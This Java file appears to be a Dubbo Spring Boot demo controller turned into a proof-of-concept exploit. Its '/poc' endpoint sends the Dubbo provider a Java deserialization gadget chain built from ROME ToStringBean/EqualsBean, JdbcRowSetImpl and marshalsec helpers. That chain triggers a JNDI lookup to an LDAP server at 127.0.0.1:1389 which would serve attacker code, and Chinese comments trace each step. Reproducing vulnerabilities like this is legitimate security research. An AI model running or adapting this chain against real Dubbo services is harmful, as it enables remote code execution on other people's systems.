/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.alibaba.boot.dubbo.demo.consumer.controller;
import com.alibaba.boot.dubbo.demo.consumer.DemoService;
import com.alibaba.dubbo.config.annotation.Reference;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import marshalsec.gadgets.JDKUtil;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

/**
 * Demo Consumer Controller (REST)
 *
 * @author <a href="mailto:mercyblitz@gmail.com">Mercy</a>
 * @see
 * @since 1.0.0
 */
@RestController
public class DemoConsumerController {

    @Reference(version = "1.0.0",
            application = "${dubbo.application.id}",
            url = "dubbo://localhost:12345")
    private DemoService demoService;

    @RequestMapping("/sayHello")
    public String sayHello(@RequestParam String name) {
        return demoService.sayHello(name);
    }

    @RequestMapping("/poc")
    public String poc() throws Exception {
        return demoService.poc(getPayload());
    }

    private static Object getPayload() throws Exception {
        String jndiUrl = "ldap://127.0.0.1:1389/uaw1pn";;//最后触发JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class,JDKUtil.makeJNDIRowSet(jndiUrl));//EqualsBean.beanHashCode调用ToStringBean.toString
        EqualsBean root = new EqualsBean(ToStringBean.class,item);//HashMap.hash调用EqualsBean.beanHashCode
        return JDKUtil.makeMap(root,root);//触发HashMap.put->HashMap.putVal->HashMap.hash
    }
}
